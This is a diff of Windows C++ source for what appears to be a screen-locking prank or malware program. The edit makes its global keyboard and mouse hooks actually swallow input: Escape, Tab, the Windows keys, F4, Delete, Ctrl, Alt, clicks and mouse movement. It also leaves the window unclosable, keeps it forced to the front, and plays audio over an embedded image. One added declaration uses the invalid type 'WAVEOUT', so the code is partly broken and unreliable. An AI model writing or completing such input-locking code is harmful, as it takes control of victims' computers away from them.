@@ -4,9 +4,6 @@
 #include <mmreg.h>
 #include <vector>
 #include <cmath>
-#include <thread>
-#include <atomic>
-#include <mutex>
 
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "winmm.lib")
@@ -15,44 +12,29 @@
 
 using namespace Gdiplus;
 
-std::atomic<bool> g_Running(true);
-std::atomic<bool> g_Taskmgr(false);
+volatile bool g_Running = true;
 HHOOK g_HookKb = NULL;
 HHOOK g_HookMs = NULL;
 HWND g_Wnd = NULL;
-HWAVEOUT g_WaveOut = NULL;
-std::vector<short> g_AudioBuffer;
-std::thread g_AudioThread;
+WAVEOUT g_WaveOut = NULL;
 
-void KbHook(int nCode, WPARAM wParam, LPARAM lParam) {
+LRESULT CALLBACK KbHook(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
         KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
         if (p->vkCode == VK_ESCAPE || p->vkCode == VK_TAB || p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_F4 || p->vkCode == VK_DELETE || p->vkCode == VK_CONTROL || p->vkCode == VK_MENU) {
-            if (p->flags & LLKHF_INJECTED) return;
-            if ((p->vkCode == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) ||
-                (p->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) ||
-                (p->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) ||
-                (p->vkCode == VK_DELETE && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000))) {
-                return;
-            }
-            return;
+            return 1;
         }
     }
-    CallNextHookEx(g_HookKb, nCode, wParam, lParam);
+    return CallNextHookEx(g_HookKb, nCode, wParam, lParam);
 }
 
-void MsHook(int nCode, WPARAM wParam, LPARAM lParam) {
+LRESULT CALLBACK MsHook(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
-        MSLLHOOKSTRUCT* p = (MSLLHOOKSTRUCT*)lParam;
-        if (p->flags & LLMHF_INJECTED) {
-            CallNextHookEx(g_HookMs, nCode, wParam, lParam);
-            return;
-        }
         if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN || wParam == WM_MOUSEMOVE) {
-            return;
+            return 1;
         }
     }
-    CallNextHookEx(g_HookMs, nCode, wParam, lParam);
+    return CallNextHookEx(g_HookMs, nCode, wParam, lParam);
 }
 
 DWORD WINAPI AudioThread(LPVOID) {
@@ -130,7 +112,6 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     case WM_PAINT: {
         PAINTSTRUCT ps;
         HDC hdc = BeginPaint(hWnd, &ps);
-        HDC hdcMem = CreateCompatibleDC(hdc);
         Bitmap* pBmp = nullptr;
         LoadImageFromResource(L"E_JPG", L"JPG", &pBmp);
         
@@ -144,8 +125,6 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             FillRect(hdc, &ps.rcPaint, brush);
             DeleteObject(brush);
         }
-
-        DeleteDC(hdcMem);
         EndPaint(hWnd, &ps);
         return 0;
     }
@@ -153,9 +132,6 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         SetForegroundWindow(hWnd);
         return 0;
     case WM_CLOSE:
-        return 0;
-    case WM_DESTROY:
-        PostQuitMessage(0);
         return 0;
     }
     return DefWindowProc(hWnd, msg, wParam, lParam);
@@ -187,8 +163,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
     g_HookKb = SetWindowsHookExW(WH_KEYBOARD_LL, (HOOKPROC)KbHook, hInstance, 0);
     g_HookMs = SetWindowsHookExW(WH_MOUSE_LL, (HOOKPROC)MsHook, hInstance, 0);
 
-    g_AudioThread = std::thread(AudioThread);
-    g_AudioThread.detach();
+    CreateThread(NULL, 0, AudioThread, NULL, 0, NULL);
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
